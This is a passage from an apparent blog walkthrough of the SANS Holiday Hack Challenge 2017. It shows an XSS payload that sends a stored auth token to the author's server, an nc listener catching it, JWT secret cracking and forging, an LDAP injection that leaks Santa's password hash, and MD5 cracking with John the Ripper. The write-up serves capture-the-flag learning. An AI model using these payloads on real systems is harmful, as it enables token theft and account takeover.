&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="edb_request_xss.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_request_xss.png" /&gt;
&lt;p&gt;Bingo, it works! Now, let's create a payload that will capture the
&lt;code&gt;np-auth&lt;/code&gt; entry from the local storage. The application uses jQuery,
which means that we can use &lt;code&gt;$.get&lt;/code&gt; to easily exfiltrate our token to our
public-facing website:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/service&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Origin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com/index.html&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=53LByIBB8Ct5Z79RdsTC&lt;/span&gt;

uid=alabaster.snowball&amp;amp;email=alabaster.snowball%40northpolechristmastown.com&amp;amp;message=&amp;lt;img src=x onerror=&amp;quot;$.get(%26quot;http://X.X.X.X/?%26quot;%2blocalStorage.getItem(%26quot;np-auth%26quot;),function(a,b){})&amp;quot; /&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And in a &lt;code&gt;nc&lt;/code&gt; on our server, we wait for our payload to get triggered:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; nc -nvk -l -p &lt;span class="m"&gt;80&lt;/span&gt;
&lt;span class="go"&gt;listening on [any] 80 ...&lt;/span&gt;
&lt;span class="go"&gt;connect to [X.X.X.X] from (UNKNOWN) [Y.Y.Y.Y] 50132&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;GET /?eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.0&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;Host: X.X.X.X&lt;/span&gt;
&lt;span class="go"&gt;Connection: close&lt;/span&gt;
&lt;span class="go"&gt;Accept: */*&lt;/span&gt;
&lt;span class="go"&gt;Referer: http://127.0.0.1/reset_request?ticket=DFYCN-8UI5I-AD87J-BRR9P&lt;/span&gt;
&lt;span class="go"&gt;Origin: http://127.0.0.1&lt;/span&gt;
&lt;span class="go"&gt;User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1&lt;/span&gt;
&lt;span class="go"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="go"&gt;Accept-Language: en-US,*&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hurray, we got our token! Let's put it in our local storage, then head to the
&lt;code&gt;index.html&lt;/code&gt; page, and... nothing. Well that's disappointing. Let's take
a look at our token. It seems to be three base64-encoded pieces of data,
separated by full stops. This seems to indicate that this is a &lt;a class="reference external" href="https://auth0.com/learn/json-web-tokens/"&gt;JSON Web Token
(JWT)&lt;/a&gt;. The first part is the
header, &lt;code&gt;{&amp;quot;alg&amp;quot;:&amp;quot;HS256&amp;quot;,&amp;quot;typ&amp;quot;:&amp;quot;JWT&amp;quot;}&lt;/code&gt;, the second part is the payload,
&lt;code&gt;{&amp;quot;dept&amp;quot;:&amp;quot;Engineering&amp;quot;,&amp;quot;ou&amp;quot;:&amp;quot;elf&amp;quot;,&amp;quot;expires&amp;quot;:&amp;quot;2017-08-16 12:00:47.248093+00:00&amp;quot;,&amp;quot;uid&amp;quot;:&amp;quot;alabaster.snowball&amp;quot;}&lt;/code&gt;,
and the third part is the signature.&lt;/p&gt;
&lt;p&gt;Our newfound token didn't work because it seems that it expired in August 2017.
We could modify the expiry date to put it in the future, but we can't compute
a new signature for our modified payload, because we don't know what secret
key is used. I tried using the trick of the &lt;code&gt;none&lt;/code&gt; algorithm (&lt;a class="reference external" href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"&gt;described
here&lt;/a&gt;),
which has worked for coworkers of mine in the past. But it didn't work in that
case.&lt;/p&gt;
&lt;p&gt;What's left to us is to try and bruteforce the secret key, so that we can
create our own JWT. &lt;code&gt;JohnTheRipper&lt;/code&gt; can actually bruteforce it for us,
since it can bruteforce HMAC-256 secret keys. We just have to &lt;a class="reference external" href="https://security.stackexchange.com/a/134829"&gt;make some
changes to our token&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat alabaster_jwt.txt
&lt;span class="go"&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9#33b6782370adad6b78486c1f83b9a2e95f7fe2b6991397a156423d874e24afa2&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; john ./alabaster_jwt.txt
&lt;span class="go"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="go"&gt;Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])&lt;/span&gt;
&lt;span class="go"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="go"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;3lv3s            (?)&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;1g 0:00:02:28 DONE 3/3 (2018-01-08 00:59) 0.006742g/s 2154Kp/s 2154Kc/s 2154KC/s 3k3ys..au10.&lt;/span&gt;
&lt;span class="go"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="go"&gt;Session completed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Wow, it worked. I must confess that it was kind of my last hope, and I wasn't
sure it was going to work. But hey, we now have our secret key, &lt;code&gt;3lv3s&lt;/code&gt;,
and we can now generate valid JWT for Alabaster. I used &lt;a class="reference external" href="https://jwt.io/"&gt;https://jwt.io/&lt;/a&gt; to do
so, and obtain the following token:&lt;/p&gt;
&lt;blockquote&gt;
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0&lt;/blockquote&gt;
&lt;p&gt;We can now log into the application:&lt;/p&gt;
&lt;img alt="edb_santa_panel.png" class="align-center" src="/images/sans-christmas-challenge-2017/edb_santa_panel.png" /&gt;
&lt;p&gt;There's a Santa panel, but we're not identified as Santa, so we can't access
it. We could try to forge a JWT for Santa, but we can see in the source code
of the application, that we actually need his password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#santa_panel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;click&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;preventDefault&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;user_json&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;dept&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;administrators&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;        &lt;span class="nx"&gt;pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Confirm you are a Claus by confirming your password: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;poster&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;santa_access&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;pass&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#inneroverlay&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                    &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.overlay&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;css&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;display&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nx"&gt;Materialize&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Incorrect Password...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;});&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;Materialize&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You must be a Claus to access this panel!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, we need to find a way to get his password. Let's take a look at the
application. Apparently, we can query the application's database for elves or
reindeers matching certain names, and get some properties:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/search&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;np-auth&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com/home.html&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=4wtVec24212atYU1RpE3&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

name=alabaster&amp;amp;isElf=True&amp;amp;attributes=profilePath,gn,sn,mail
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mon, 08 Jan 2018 00:08:50 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;


[[[&amp;quot;cn=alabaster,ou=elf,dc=northpolechristmastown,dc=com&amp;quot;,{&amp;quot;gn&amp;quot;:[&amp;quot;Alabaster&amp;quot;],&amp;quot;mail&amp;quot;:[&amp;quot;alabaster.snowball@northpolechristmastown.com&amp;quot;],&amp;quot;profilePath&amp;quot;:[&amp;quot;/img/elves/elf1.PNG&amp;quot;],&amp;quot;sn&amp;quot;:[&amp;quot;Snowball&amp;quot;]}]]]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Given the result's format, we can expect the application to performan LDAP
query to retrieve the wanted attributes. If only we knew the syntax of this
query... But, wait! Let's see what we have in the application source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;//Note: remember to remove comments about backend query before going into north pole production network&lt;/span&gt;
&lt;span class="cm"&gt;/*&lt;/span&gt;

&lt;span class="cm"&gt;isElf = &amp;#39;elf&amp;#39;&lt;/span&gt;
&lt;span class="cm"&gt;if request.form[&amp;#39;isElf&amp;#39;] != &amp;#39;True&amp;#39;:&lt;/span&gt;
&lt;span class="cm"&gt;    isElf = &amp;#39;reindeer&amp;#39;&lt;/span&gt;
&lt;span class="cm"&gt;attribute_list = [x.encode(&amp;#39;UTF8&amp;#39;) for x in request.form[&amp;#39;attributes&amp;#39;].split(&amp;#39;,&amp;#39;)]&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="cm"&gt;result = ldap_query(&amp;#39;(|(&amp;amp;(gn=*&amp;#39;+request.form[&amp;#39;name&amp;#39;]+&amp;#39;*)(ou=&amp;#39;+isElf+&amp;#39;))(&amp;amp;(sn=*&amp;#39;+request.form[&amp;#39;name&amp;#39;]+&amp;#39;*)(ou=&amp;#39;+isElf+&amp;#39;)))&amp;#39;, attribute_list)&lt;/span&gt;
&lt;/span&gt;
&lt;span class="cm"&gt;#request.form is the dictionary containing post params sent by client-side&lt;/span&gt;
&lt;span class="cm"&gt;#We only want to allow query elf/reindeer data&lt;/span&gt;

&lt;span class="cm"&gt;*/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have the syntax of the query. And there doesn't seem to be any filtering
on our parameters, so we can try to perform an &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap"&gt;LDAP injection&lt;/a&gt;.
I recommend you read this link, to better understand how the LDAP syntax works.&lt;/p&gt;
&lt;p&gt;Now, we want to perform our injection in the &lt;code&gt;name&lt;/code&gt; parameter. The goal
is to get a query that will match Santa's user entry. I ended up going with
the following payload: &lt;code&gt;santa*)(ou=*))(&amp;amp;(sn=foo&lt;/code&gt;. Indeed, the final
syntax is then:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(|(&amp;amp;(gn=*santa*)(ou=*))(&amp;amp;(sn=foo*)(ou=elf))(&amp;amp;(sn=*santa*)(ou=*))(&amp;amp;(sn=foo*)(ou=elf)))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This query should match Santa, since we're searching for entries with names
containing &lt;code&gt;santa&lt;/code&gt; in any organizational unit. Now, let's perform our
search. Since we're allowed to query any attributes we want, let's ask for the
&lt;code&gt;userPassword&lt;/code&gt; attribute, found in the earlier
&lt;code&gt;LDIF_template.txt&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/search&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Origin&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com&lt;/span&gt;
&lt;span class="na"&gt;np-auth&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://edb.northpolechristmastown.com/home.html&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SESSION=4F359T9wWTvpBczV3335&lt;/span&gt;

&lt;span class="hll"&gt;name=santa*)(ou=*))(%26(sn=foo&amp;amp;isElf=True&amp;amp;attributes=userPassword
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mon, 08 Jan 2018 00:16:42 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;113&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="p"&gt;[[[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cn=santa,ou=human,dc=northpolechristmastown,dc=com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;userPassword&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;d8b4c05a35b0513f302a85c409b4aab3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]}]]]&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have Santa's hashed password. Given the form, it seems to be an MD5
hash. Let's use &lt;code&gt;JohnTheRippher&lt;/code&gt; again to try and crack it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat santa_password.txt
&lt;span class="go"&gt;d8b4c05a35b0513f302a85c409b4aab3&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; john --format&lt;span class="o"&gt;=&lt;/span&gt;raw-md5 --wordlist&lt;span class="o"&gt;=&lt;/span&gt;./rockyou.txt ./santa_password.txt
&lt;span class="go"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="go"&gt;Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])&lt;/span&gt;
&lt;span class="go"&gt;Warning: no OpenMP support for this hash type, consider --fork=4&lt;/span&gt;
&lt;span class="go"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;001cookielips001 (?)&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;1g 0:00:00:00 DONE (2018-01-08 01:23) 1.315g/s 18776Kp/s 18776Kc/s 18776KC/s 002007238..00196900&lt;/span&gt;
&lt;span class="go"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="go"&gt;Session completed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hurray, we have Santa's password! We can now log into the application, and
access his panel. This gives us access to this letter, sent to him:&lt;/p&gt;
&lt;img alt="wizard_of_oz_to_santa_d0t011d408nx.png" class="align-center" src="/images/sans-christmas-challenge-2017/wizard_of_oz_to_santa_d0t011d408nx.png" /&gt;
&lt;p&gt;Here's what the letter says:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;From: The Wizard of Oz&lt;/p&gt;
&lt;p&gt;Emerald City, Oz&lt;/p&gt;
&lt;p&gt;To: Santa Claus&lt;/p&gt;
&lt;p&gt;Christmas Town, North Pole&lt;/p&gt;
&lt;p&gt;Dear Santa,&lt;/p&gt;
&lt;p&gt;My old friend! I wish you a very merry Christmas. Thank you for all you do
to bring holiday cheer around the world.&lt;/p&gt;
&lt;p&gt;Every year, I enjoy our gift exchange -- you giving me a Christmas present
and I giving you a Solstice gift. We've exchanged some crazy things in the
past. By my reckoning, you've given me:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Big Hair Hairspray&lt;/li&gt;
&lt;li&gt;Pink Election Campaign Hat&lt;/li&gt;
&lt;li&gt;Bacon Bandages&lt;/li&gt;
&lt;li&gt;Scapy the Unicorn Plush Pillow&lt;/li&gt;
&lt;li&gt;Princess Leia Earmuffs&lt;/li&gt;
&lt;li&gt;Bacon Tie with Giant TV Remote&lt;/li&gt;
&lt;li&gt;Stormtrooper Boxer Shorts&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ah what fun times! And I've given you:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The Nubulator&lt;/li&gt;
&lt;li&gt;Garden Gnome&lt;/li&gt;
&lt;li&gt;Justin Bieber Toothbrush&lt;/li&gt;
&lt;li&gt;Snorty the Pig Hat and Pink Gloves&lt;/li&gt;
&lt;li&gt;Giant Inflatable Olaf the Snowman&lt;/li&gt;
&lt;li&gt;Ariana Grande Light-up Cat Ear Headphones&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Well, wait 'til you see what I've got for you this year, my friend! Yule
love it!&lt;/p&gt;
&lt;p&gt;Merry Christmas!&lt;/p&gt;
&lt;p class="attribution"&gt;&amp;mdash;The Wizard&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Well, it's nice to see that Santa gets gifts too!&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="answers-to-the-questions"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id59"&gt;Answers to the questions&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Let's answer the questions:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;&lt;cite&gt;Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The title of the first page of &lt;em&gt;The Great Book&lt;/em&gt; is &lt;strong&gt;About This Book...&lt;/strong&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;&lt;cite&gt;Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?&lt;/cite&gt;&lt;/li&gt;
